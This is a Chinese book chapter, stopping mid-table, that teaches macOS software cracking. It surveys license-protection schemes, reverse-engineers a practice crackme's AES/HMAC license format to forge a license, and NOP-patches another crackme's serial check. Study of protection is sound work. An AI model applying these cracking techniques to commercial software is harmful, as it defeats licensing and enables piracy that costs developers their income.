为了最大程度地保护软件开发人员的利益，苹果公司在预防与打击盗版软件上做了不少功课。破解与反破解技术也在破解者与开发人员之间的技术对抗中默默地进化着。本章将探讨软件加密方式的常见破解方法，以及macOS系统上特有的App Store内购机制，向广大软件开发人员展示软件的解密技术，希望在软件保护领域给软件开发人员一些启发。

### 9.1 软件破解步骤

很多商业软件的注册与验码机制都是跨平台通用的，它们的破解思路也是相通的，步骤大多如下所示。

(1) 了解保护类型。不同的软件保护类型，在进行实际操作时，使用的破解手法不尽相同，了解软件保护类型的主要方法是：阅读软件官方的注册方法与运行软件。商业软件在官方网站与使用文档中，通常会详细讲述软件的注册方法及费用。通过注册方法一般可以直观地了解软件的注册机制，以此可以初步判断软件可能使用的保护技术；另外，通过直接运行软件，可以一目了然地了解商业软件的保护类型。了解保护类型这一步比较简单，花费的时间一般比较少。

(2) 定位注册机制。使用静态分析与动态调试等软件分析技术，定位到软件的注册机制。这一步需要花费的时间取决于软件的加密强度以及分析人员的软件分析技术实力。

(3) 分析注册机制。这一步比上一步的难度要高，如果只是爆破软件还好，但如果需要完整地了解软件的加密机制，还原软件的注册算法，分析人员则需要具备一定的反汇编阅读能力与软件开发知识。

(4) 尝试破解。如果是爆破软件，这一步是对目标程序进行修改破解，或者编写软件补丁；如果是了解注册机制，这一步需要自己手写代码来还原注册代码。根据软件的保护类型，可能同时需要补丁修改软件。

(5) 测试破解。原始软件经过补丁或注册后，运行查看它的实际效果，以此来判断是否破解完成。如果成功，表示破解完成；如果失败，则需要回到第2步，循环操作，直到破解完成。

### 9.2 常见的保护类型

了解软件的保护类型，最快速的方法就是大量使用市面上存在的各种类型的商业软件。软件的开发人员为了防止自家软件遭到破解与盗版，会使用自己研发的软件保护机制，这些保护机制经过一定时间的广泛应用，也就形成了形形色色的软件保护类型。

目前，市面上的软件通常有如下几类保护形式。

# 1. 试用版&序列号

这种保护类型是最先在互联网上广泛沿用的，即使在今天，这种软件保护形式依然流行。软件开发人员在官网上发布软件演示版本或完整版本的软件，这类软件通常有一个试用期，在试用期内，用户可以试用软件的部分或全部功能，试用期过后，用户必须购买软件的注册码才能继续使用，否则软件会拒绝运行。

# 2. License授权

试用版&序列号形式的软件保护机制流行一段时间后，就出来了破解版本。破解它们甚至不需要修改软件，只需要用户从其他渠道获取一个正版用户的注册序列号即可。这对于使用试用版&序列号方式作为软件保护技术的开发人员来说，无疑是毁灭性的打击！软件也许只卖出几份就再也卖不动了。此时，License授权保护方式出现了。License授权通常是一个明文或加密的授权文件，当用户购买了正版软件后，会获取一个授权文件，里面记录了软件购买人的信息、软件的购买日期与有效期，以及运行软件的电脑的机器码等。当用户把授权文件复制到其他电脑上时，会因为系统的机器码不同而授权失败。伴随着License授权方式的出现，试用版&序列号授权方式也发生了变化，在新的验证算法中通常会加上用户运行电脑的机器码，防止注册序列号在未授权的机器上使用。

# 3. 重启验证与暗桩

早期的试用版&序列号与License授权都是一次注册检查，之后运行不再对软件的授权信息做验证，此时的软件破解非常简单。后来在软件保护技术发展的过程中，开发人员加强了验证，包括软件重启后重新验证软件授权的合法性，或者在软件功能上插上暗桩，验证失败时并不提示用户，而是在软件的输出信息中打上演示版水印，或者直接让软件的某些功能失效。这类软件的破解麻烦一些，破解人员需要在测试上花费大量时间，找出软件中的“暗桩”并将其去除。到下一次软件升级时，这样的工作又得继续。

# 4. 防拷贝技术

License授权很快也被破解了。破解人员发现直接补丁软件的机器码生成部分的逻辑代码，就可以让软件在每次启动时，计算的机器码是一样的。这样一个正版用户的授权序列号与License文件就可以复制到其他计算机上使用了。此时，旧的软件保护技术已经显得力不从心了，好在防拷贝技术诞生了！防拷贝技术最先应用于游戏加密。游戏厂商发现游戏被大量盗版商盗版，破解

人员补丁了机器码生成算法，将游戏光盘上的文件复制到计算机上并打上机器码补丁，盗版商就可以直接刻录售卖。这让游戏厂商损失惨重。新的防拷贝技术使用了软件壳加密与光盘防拷贝技术，让软件破解的门槛直接上升到了一个新的高度。在很长的一段时间里，防拷贝技术有效地遏制了软件的破解。

# 5. 网络验证

软件的破解与防破解是相对的。一段时间后，软件的防破解技术就被成功破解了。游戏厂商与软件开发人员只好积极地想办法应对新的破解手段，网络验证就是一种很有效的验证方式。在新的软件保护方式下，软件的合法性验证不仅仅是在本地计算机上做检查，即使软件注册成功，用户提交的注册信息也会被不定时地提交到软件开发商上的服务器上做检查，单纯地对软件本地软件进行机器码补丁已经不再适用了！

# 6. 混合验证

破解人员后来发现，对网络验证的破解并没有想象中那么难，只要将软件中的网络验证模块代码去除掉，以前的破解技术依然可以使用。此时，开发人员的防破解经验已经很丰富了，他们已经不再拘泥于单一的软件防破解技术，所有市面上用到的软件防破解技术都被集成进了软件的新版本中：软件被强壳保护着，反调试器与反静态分析成为了标配，除了对授权信息进行网络验证之外，软件的完整版以及一些功能模块只有通过验证才能下载使用。本书将这类软件的保护称为混合验证。软件保护技术发展至今，混合验证的商业软件越来越多。随着新的加解密算法的发布，破解与反破解技术依旧在未知的技术层面上进化着。

#### 9.2.1 试用版&序列号

第6章中讲解的crackme就是典型的序列号验证方式，针对这种单纯的保护形式，破解手法自然是找到关键点进行爆破，或者分析注册算法完成注册机的制作。读者可以阅读第6章，回顾这类软件的破解方法，此处不再赘述。

#### 9.2.2 License 授权

采用License授权方式的软件通常使用一个自定义格式的授权文件,授权文件中包含了用户的注册信息,用户注册时导入授权文件即可。本节的crackme_lic程序就是一个典型的授权文件形式的crackme,如图9-1所示。

crackme运行后，从界面给出的提示来看，需要导入一个授权文件进行注册，但并没有指出授权文件的格式。根据提示点击“Register”按钮，随便选择一个文件，会弹出注册错误的提示信息，如图9-2所示。

 </div>

 </div>

打开Console监控程序的Log输出（也可以使用第三方工具NSLogger $ ^{①} $，如图9-3所示，但没有什么有用的Log信息。

 </div>

下面换一种分析思路。既然crackme属于License授权类型，那么在启动的时候必然会读取授权文件。首先关闭crackme，然后打开文件系统监控工具FileMon $ ^{①} $，并将Process设置为crackme_lic，再次运行crackme_lic，就得到了有用的信息，如图9-4所示。

 </div>

可以看到，crackme_lic在读取并加载了系统的框架后，读取了~/Documents/.crackme.lic文件。根据文件名可以大胆地猜测，这就是程序启动时加载的授权文件。打开Hopper，将crackme_lic拖进去分析。搜索字符串“.crackme.lic”，有一处结果，按X键查看交叉引用，发现有3处调用，如图9-5所示。

 </div>

OnClean()应该是清除注册信息，applicationDidFinishLaunching()应该是启动时加载注册信息，OnReg()应该就是要查找的注册验证的代码。点击进去，按照第6章的分析方法，很快可以找到关键代码，如下所示：

   </div>

0000000100003d30
mov
rdi, qword [ds:imp__got__swift_isaMask]

0000000100003da1
mov
rcx, qword [ds:rax]
0000000100003da4
and
rcx, qword [ds:rdi]
0000000100003da7
mov
rcx, qword [ds:rcx+0xf8]
0000000100003dae
mov
rdi, qword [ss:rbp+var_20]
0000000100003db2
mov
rsi, qword [ss:rbp+var_18]
0000000100003db6
mov
rdx, qword [ss:rbp+var_10]
0000000100003dba
mov
qword [ss:rbp+var_3D8], rdi
0000000100003dc1
mov
rdi, rdx ; argument "instance" for method
imp_stubs_swift_unknownRetain
0000000100003dc4
mov
qword [ss:rbp+var_3E0], rcx
0000000100003dcb
mov
qword [ss:rbp+var_3E8], rdx
0000000100003dd2
mov
qword [ss:rbp+var_3F0], rsi
0000000100003dd9
call
imp_stubs_swift_unknownRetain
0000000100003dde
lea
rcx, qword [ss:rbp+var_68]
0000000100003de2
mov
rdi, qword [ss:rbp+var_3D8]
0000000100003de9
mov
rsi, qword [ss:rbp+var_3F0]
0000000100003df0
mov
rdx, qword [ss:rbp+var_3E8]
0000000100003df7
mov
r8, qword [ss:rbp+var_1B8]
0000000100003dfe
mov
rax, qword [ss:rbp+var_3E0]
0000000100003e05
call
rax
test
jne
0x100003e10
0000000100003e0b
jmp
0x100004563

0000000100003e05行的call rax应该就是注册验证算法，它的值来源于rcx寄存器，是当前类实例0xf8偏移处的方法，在0000000100003e05行打上断点，然后点击菜单Debug→Select Debugger，点击Local Debugger启动本地调试器。在打开的调试窗口中，点击第一个右三角按钮（Continue Execution）启动程序，启动完成后，点击“Register”选择任意一个文件，此时断点会命中，程序暂停后rax寄存器的值为0000000100004BE0，如图9-6所示。

 </div>

在键盘上按g跳转过去，发现是___TFC11crackme_lic11AppDelegate12checkLicenseFTS7-reginfoRVSO_7RegInfo_Sb:。下一步是分析该方法来了解授权文件的验证过程。是时候请出IDA Pro了，打开IDA Pro，定位到该方法，按空格键查看该方法的流程图，如图9-7所示。

 </div>

这是一个很复杂的流程，如果直接查看反汇编，工作量会非常大，下面我们直接查看该方法的伪代码。首先查看以下代码：

v422 = (_QWORD *)a5;
LODWORD(v5) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS( //Swift.String.init
           "-----license file begin-----\\n",
          49LL,
          1LL);
.....
LODWORD(v8) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS(
           "\\n-----license file end-----",
          47LL,
          1LL);
.....
//Swift.String.hasPrefix(Swift.String)
v11 = ~(unsigned __int8)_TFSS9hasPrefixfSSSb(v420, v421, v419, a1, a2, v424);

//Swift.String.hasSuffix(Swift.String)
v12 = ~(unsigned __int8)_TFSS9hasSuffixfSSSb(v418, v417, v416, a1, a2, v424);
.....

这段代码是判断授权文件是不是以“-----license file begin-----\n”
，以“\n-----license file end-----”结尾。接下来代码如下：

//Swift.String.init()
LODWORD(v13) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS(&amp;", OLL, 1LL);
v14 = v13;
v16 = v15;
v18 = v17;
//Swift.String.(stringByReplacingOccurrencesOfString (Swift.String, withString : Swift.String, options : ...)
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA1_(&amp;),
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA2_(&amp;),
LODWORD(v20) =
_TFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SS(
    v421, v422, v420, v14, v16, v18);

LODWORD(v24) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS(&amp;", OLL, 1LL);
v25 = v24;
v27 = v26;
v29 = v28;
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA1_(&amp;),
    &amp;", OLL, v26, v28, v30);
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA2_(&amp;),
LODWORD(v31) =
_TFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SS(
    v419, v418, v417, v25, v27, v29);

LODWORD(v37) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS(&amp;", OLL, 1LL);
v39 = v38;
v40 = v37;
v42 = v41;
LODWORD(v43) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS(&amp;", OLL, 1LL);
v44 = v43;
v46 = v45;
v48 = v47;
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA1_(&amp;),
    &amp;", OLL, v45, v47, v49);
_TIFE10FoundationSS36stringByReplacingOccurrencesOfStringFTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeWSS13CharacterView5Index_SSA1_(&amp;),

mpareOptions5rangeGSqGVs5RangeVVSS13CharacterView5Index___SSA2_(&v770);
LODWORD(v50) =
_TFE10FoundationSS36stringByReplacingOccurrencesOfStringfTSS10withStringSS7optionsVSC22NSStringCompareOptions5rangeGSqGVs5RangeVVSS13CharacterView5Index___SS(
v40, v39, v42, v44, v46, v48);
.....

这一段代码将授权信息的开头与结尾以及换行全部删除，只取授权信息的正文部分。接着调用AES对数据进行解密，解密的key为“crackmechecklice”，代码如下：

//Swift.String.init()
LODWORD(v70) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("crackmechecklice", 16LL, 1LL);
v756 = v70;
v757 = v71;
v758 = v72;
v413 = v72;
swift_unknownRetain(v414);
swift_unknownRetain(v413);
//Swift.String.aesEBCDecryptFromBase64(Swift.String) -> Swift.String?
_TFE11crackme_licSS23aesEBCDecryptFromBase64fSSGSqSS_(__int64)&v752);
.....

代码解密完成后，接着就是解析了。代码片段如下：

//static JSONLib.JSValue.parse (Swift.String) -> (value: JSONLib.JSValue?, error: JSONLib.Error?)
_TZFV7JSONLib7JSValue5parsefSST5valueGSqSO_5errorGSqCS_5Error_(&v722, v405, v404, v403);

//Swift.String.init()
LODWORD(v84) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("username", 8LL, 1LL);

//Swift.String.init()
LODWORD(v87) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("sn", 2LL, 1LL);

//Swift.String.init()
LODWORD(v90) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("machinecode", 11LL, 1LL);

//JSONLib.JSValue.subscript.getter: (Swift.String) -> JSONLib.JSValue
_TFV7JSONLib7JSValue9subscriptFSSSO_(&v652, v90, v91, v92, &v656);

//JSONLib.JSValue.string.getter: Swift.String?
_TFV7JSONLib7JSValue6stringGSqSS_(&v644, &v648);

以上代码是从JSON数据中解析出“username”、“sn”、“machinecode”这3个字段。接下来的代码如下所示：

//(extension in crackme_lic):Swift.String.aesEBCDecryptFromBase64 (Swift.String) -> Swift.String?
_TFE11crackme_licSS23aesEBCDecryptFromBase64fSSGSqSS_((_int64)&v589);
.....
//Swift.String.isEmpty.getter : Swift.Bool

 $ v93 = \_\_TFSSg7isEmptySb(v372, v371, v370); $

 $ v94 = \_\_TFSSg7isEmptySb(v364, v363, v362); $

 $ v95 = \_\_TFSSg7isEmptySb(v361, v360, v359); $

LODWORD(v96) = \_\_TFSSg10charactersVSS13CharacterView(v372, v371, v370);

if (v555 >= 6) //用户名长度不能小于6位

分析到这里, 通常配合动态调试会更加方便一些。在000000010000712d行调用aesEBCDecrypt-FromBase64()方法下断点, 当断点命中时, 可以看到r8寄器存保存的要解密的数据以及r9寄存器保存的数据的长度, 在Hopper的Debugger Console中执行以下命令:

register read r8
     r8 = 0x00000001010cc2a0

register read r9
     r9 = 0x000000000000002c

memory read --count 0x2c 0x0000001010CC2A0

0x1010cc2a0: 39 79 6f 2b 37 4b 35 66 62 50 2f 61 70 53 44 72 9yo+7K5fbP/apSDr
0x1010cc2b0: 35 67 78 49 42 4b 75 6c 44 76 79 36 59 64 5a 5a 5gxIBKulDvy6YdZZ
0x1010cc2c0: 41 31 65 74 64 51 70 53 35 5a 59 3d
A1etdOpS5ZY=

调试效果如图9-8所示。

 </div>

传入的字符串 "9yo+7K5fbP/apSDr5gxIBKulDvy6YdZZA1etdOpS5ZY=" 是构造的 AES 加密过的注册码数据。

再往下就是判断传入的用户名长度是否小于6位，小于6位则返回。接着是对解密后的注册码进行判断，代码如下所示：

//(extension in Swift):Swift.CollectionType.count.getter : A.Index.Distance
_TFEsPs14CollectionTypeg5countWx5Index8Distance_(
&v551,
_TMVSS13CharacterView_ptr,
_TWPVSS13CharacterViews14CollectionTypes_ptr,
v356,
v115,
_TMVs9Character_ptr);
swift_unknownRelease(v554);
v119 = v551 != 19; //注册码必须是19位

//(extension in crackme_lic):Swift.String.subscript.getter : (Swift.Range<Swift.Int>) -> Swift.String
LODWORD(v120) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(4LL, 5LL, v364, v363, v362);

//Swift.String.init()
LODWORD(v123) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);

//static Swift.!= infix <A where A: Swift.Equatable> (A, A) -> Swift.Bool
v126 = _TZFsoi2neuRxs9EquatablerFTxx_Sb(&v548, &v545, _TMSS_ptr, _TWPSSs9Equatables_ptr);

//(extension in crackme_lic):Swift.String.subscript.getter : (Swift.Range<Swift.Int>) -> Swift.String
LODWORD(v127) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(9LL, 10LL, v364, v363, v362);

//Swift.String.init()
LODWORD(v130) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);

v133 = _TZFsoi2neuRxs9EquatablerFTxx_Sb(&v542, &v539, _TMSS_ptr, _TWPSSs9Equatables_ptr);

//(extension in crackme_lic):Swift.String.subscript.getter : (Swift.Range<Swift.Int>) -> Swift.String
LODWORD(v134) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(14LL, 15LL, v364, v363, v362);

//Swift.String.init()
LODWORD(v137) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);

//static Swift.!= infix <A where A: Swift.Equatable> (A, A) -> Swift.Bool
v140 = _TZFsoi2neuRxs9EquatablerFTxx_Sb(&v536, &v533, _TMSS_ptr, _TWPSSs9Equatables_ptr);

这段代码的含义是注册码长度必须是19位，且第4位、第9位、第15位必须是“-”分隔符，否则注册失败。接着是生成注册码做比对，代码如下：

//static CommonCryptoSwift.Hash.MD5 (Swift.String) -> Swift.String?
//Hash.MD5(username)
_TZFV17CommonCryptoSwift4Hash3MD5fSSGSqSS_(&v529, v372, v371, v370);

//static CommonCryptoSwift.Hash.SHA1 (Swift.String) -> Swift.String?
//Hash.SHA1(username)
_TZFV17CommonCryptoSwift4Hash4SHA1fSSGSqSS_(&v518, v372, v371, v370);
//hmac key = "crackme!"
LODWORD(v141) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("crackme!", 8LL, 1LL);
//HMAC.MD5(username, "crackme!")
//static CommonCryptoSwift.HMAC.MD5 (Swift.String, key : Swift.String) -> Swift.String?
_TZFV17CommonCryptoSwift4HMAC3MD5fTSS3keySS_GSqSS_(&v507, v372, v371, v370, v141, v142);
//hmac key = "crackme!"
LODWORD(v143) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("crackme!", 8LL, 1LL);
//static CommonCryptoSwift.HMAC.SHA1 (Swift.String, key : Swift.String) -> Swift.String?
//HMAC.SHA1(username, "crackme!")
_TZFV17CommonCryptoSwift4HMAC4SHA1fTSS3keySS_GSqSS_(&v496, v372, v371, v370, v143, v144);
//(extension in crackme_lic): Swift.String.subscript.getter : (Swift.Range<Swift.Int>) -> Swift.String
//以下代码取用户名md5值的第0位、第4位、第8位、第12位
LODWORD(v145) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(OLL, 1LL, v347, v346, v345);
.....
LODWORD(v150) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(4LL, 5LL, v347, v346, v345);
.....
LODWORD(v155) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(8LL, 9LL, v347, v346, v345);
.....
LODWORD(v160) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(12LL, 13LL, v347, v346, v345);
.....
//以下代码取用户名sha1值的第0位、第4位、第8位、第12位
LODWORD(v165) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(OLL, 1LL, v340, v339, v338);
.....
LODWORD(v170) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(4LL, 5LL, v340, v339, v338);
.....
LODWORD(v175) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(8LL, 9LL, v340, v339, v338);
.....
LODWORD(v180) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(12LL, 13LL, v340, v339, v338);
.....
//以下代码取用户名hamcmd5值的第0位、第4位、第8位、第12位
LODWORD(v185) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(OLL, 1LL, v333, v332, v331);
.....
LODWORD(v190) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(4LL, 5LL, v333, v332, v331);
.....
LODWORD(v195) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(8LL, 9LL, v333, v332, v331);
.....
LODWORD(v200) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(12LL, 13LL, v333, v332, v331);
.....
//以下代码取用户名hmacsha1值的第0位、第4位、第8位、第12位
LODWORD(v205) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(OLL, 1LL, v326, v325, v324);
.....
LODWORD(v210) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(4LL, 5LL, v326, v325, v324);
.....
LODWORD(v215) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(8LL, 9LL, v326, v325, v324);
.....
LODWORD(v220) = _TFE11crackme_licSSg9subscriptFGVs5RangeSi_SS(12LL, 13LL, v326, v325, v324);
.....
LODWORD(v225) = _TZFsoi1pFTSSSS_SS(v148, v149, v323, v153, v154, v322);
.....
LODWORD(v231) = _TZFsoi1pFTSSSS_SS(v226, v228, v230, v158, v159, v321);

LODWORD(v237) = _TZFsoi1pFTSSSS_SS(v232, v234, v236, v163, v164, v320);
//以下代码将md5、sha1、hmacmd5、hmacsha1计算后的4位值使用“-”相连
//即md5(username)[0-4]-sha1(username)[0-4]-hmacmd5(username)[0-4]-hmacsha1(username)[0-4]
LODWORD(v240) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);
//static Swift.+= infix
_TZFsoi2peFTRSSSS_T_(&v835, v240);
swift_unknownRetain(v319);
swift_unknownRetain(v318);
LODWORD(v241) = _TZFsoi1pFTSSSS_SS(v168, v169, v319, v174, v318);
.....
LODWORD(v247) = _TZFsoi1pFTSSSS_SS(v242, v244, v246, v178, v179, v317);
.....
LODWORD(v253) = _TZFsoi1pFTSSSS_SS(v248, v250, v252, v183, v184, v316);
_TZFsoi2peFTRSSSS_T_(&v835, v253);
LODWORD(v254) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);
_TZFsoi2peFTRSSSS_T_(&v835, v254);
swift_unknownRetain(v315);
swift_unknownRetain(v314);
LODWORD(v255) = _TZFsoi1pFTSSSS_SS(v188, v189, v315, v193, v194, v314);
.....
LODWORD(v261) = _TZFsoi1pFTSSSS_SS(v256, v258, v260, v198, v199, v313);
.....
LODWORD(v267) = _TZFsoi1pFTSSSS_SS(v262, v264, v266, v203, v204, v312);
_TZFsoi2peFTRSSSS_T_(&v835, v267);
LODWORD(v268) = _TFSSCfT21_builtinStringLiteralBp8byteSizeBw7isASCIIBi1_SS("-", 1LL, 1LL);
_TZFsoi2peFTRSSSS_T_(&v835, v268);
swift_unknownRetain(v311);
swift_unknownRetain(v310);
LODWORD(v269) = _TZFsoi1pFTSSSS_SS(v208, v209, v311, v213, v214, v310);
.....
LODWORD(v275) = _TZFsoi1pFTSSSS_SS(v270, v272, v274, v218, v219, v309);
.....
LODWORD(v281) = _TZFsoi1pFTSSSS_SS(v276, v278, v280, v223, v224, v308);
_TZFsoi2peFTRSSSS_T_(&v835, v281); //static Swift.+= infix
//Swift.String.uppercaseString.getter : Swift.String
LODWORD(v282) = _TFSSg15uppercaseStringSS(v364, v363, v362);
.....
//以下代码将计算后的注册码转大写后与传入的注册码大写做比较，如果相等就算通过
//Swift.String.uppercaseString.getter : Swift.String
LODWORD(v288) = _TFSSg15uppercaseStringSS(v285, v287, v286);
.....
//tatic Swift.!= infix <A where A: Swift.Equatable> (A, A) -> Swift.Bool
if ( _TZFsoi2neuRxs9EquatablerFTxx_Sb(&v438, &v435, _TMSS_ptr, _TWPSSs9Equatables_ptr) & 1 )

代码的功能详见以上注释部分。最后就是机器码的验证了，代码如下：

//调用机器码生成方法，方法地址为当前类的偏移0x118
LODWORD(v294) = (*(int(_fastcall **)(_OWORD *, __int64 *))((*(_OWORD *)swift_isaMask_ptr & *v423) + 0x118LL))(v423, &v435);

//以下代码是将计算的机器码与传入的机器码都转大写后做比较，如果相等就注册成功了
LODWORD(v297) = _TFSSg15uppercaseStringSS(v294, v295, v296);

LODWORD(v300) = _TFSSg15uppercaseStringSS(v361, v360, v359);
if ( _TZFsoi2neuRxs9EquatablerFTxx_Sb(&v429, &v426, _TMSS_ptr, _TWPSSs9Equatables_ptr) & 1)
.....

通过动态调试得知，调用机器码生成方法为___TFC11crackme_lic11AppDelegate10get-MacAddrFT_SS，也就是getMacAddr()方法。它的代码此处就不展开介绍了，主要是获取本机的mac地址，然后将它的冒号“:”去除后取Base64值。

根据以上分析，得知授权文件的格式为：

----- license file begin-----
加密的授权信息(lic_content) = Base64(AESECBEncrypt(jsondata, "crackmechecklice"))
----- license file end-----
加密前的授权信息jsondata的格式为：
jsondata =
{
    "username": 用户名，长度不能小于6位，
    "sn": AESECBEncrypt("xxxx-xxxx-xxxx-xxxx"),
    "machinecode": getMacAddr()的取值
}

接下来只需要根据分析结果构造License文件即可，注册成功后效果如图9-9所示。

 </div>

#### 9.2.3 重启验证与暗桩

重启验证是目前比较常见的验证方式，前面介绍的crackme都使用了重启验证。单纯的重启验证很容易被突破，这种验证方式通常配合其他验证方式一起对软件进行保护，典型的有暗桩技术。根据软件作者编写代码风格，暗桩可以分为主动型暗桩与被动型暗桩。

主动型暗桩，是指软件作者在部分功能代码中加入软件合法性与完整性检测，这段代码一般独立于软件的注册机制部分。当检测到软件使用破解修改版本时，软件会“默默地”执行异常行为的代码，或关闭软件的部分功能，或者直接让软件崩溃退出。

被动型暗桩，它的被动性体现在作者自己没有添加任何合法性检测代码，而是软件自身的注册机制中就已经包含。作者在注册机制中会计算生成部分的数据，这些数据可以是直接运行的代码，也可以是后期用于代码逻辑的有效数据。当软件被破解后，软件运行时生成的数据就是无效的，后期代码在运行时必然会出现错误或不可预知的结果。

我们在上一节讲了重启验证的分析方式，这一节就通过crackme程序给大家展示“被动型”暗桩程序的运行效果与破解方式。运行本节的whoisshe程序，效果如图9-10所示。

 </div>

输入正确的用户名与注册码后，点击“Look!”按钮，程序会显示一张美女照片。输入错误的信息，会弹出错误提示。

使用Hopper载入程序，搜索弹出的错误信息“serial number error!”，快速定位到验证码检测的地方，找到onLook()方法后，使用Hopper动态调试，最终找到验证码检测的关键地方0000000100005A90，如图9-11所示。

 </div>

计算验证码的代码比较长，这一次我们就尝试暴力破解。找到第一个向下跳转返回的跳转，代码如下：

0000000100005ca4 call imp_stubs_TFEsPs14CollectionTypeg5countWx5Index8Distance_
0000000100005ca9 mov rdi, qword [ss:rbp+var_80] ; argument "instance" for method
imp_stubs_swift_unknownRelease
0000000100005cad call imp_stubs_swift_unknownRelease
0000000100005cb2 mov rax, qword [ss:rbp+var_98]
0000000100005cb9 cmp rax, 0x6
0000000100005cbd jge 0x100005cce
0000000100005cbf xor eax, eax
0000000100005cc1 mov cl, al
0000000100005cc3 mov byte [ss:rbp+var_31], cl
0000000100005cc9 jmp 0x100007d79

● ● ● ● ● ●

这一段代码是计算用户名的长度，如果长度小于6，就将结果置0，并调用0000000100005cc9行的jmp 0x100007d79返回。从流程上看，这就是爆破点，将0000000100005cb9行的cmp rax, 0x6与0000000100005cbd行的jge 0x100005cce改成空指令nop，然后将0000000100005cbf行的xor eax, eax改成mov al, 1。改后的指令如下所示：

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cad</td><td style='text-align: center; word-wrap: break-word;'>call</td><td style='text-align: center; word-wrap: break-word;'>imp_stubs_swift_unknownRelease</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cb2</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>rax, qword [ss:rbp+var_98]</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cb9</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cba</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cbb</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cbc</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cbd</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cbe</td><td style='text-align: center; word-wrap: break-word;'>nop</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cbf</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>al, 0x1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cc1</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; word-wrap: break-word;'>cl, al</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>0000000100005cc3</td><td style='text-align: center; word-wrap: break-word;'>mov</td><td style='text-align: center; 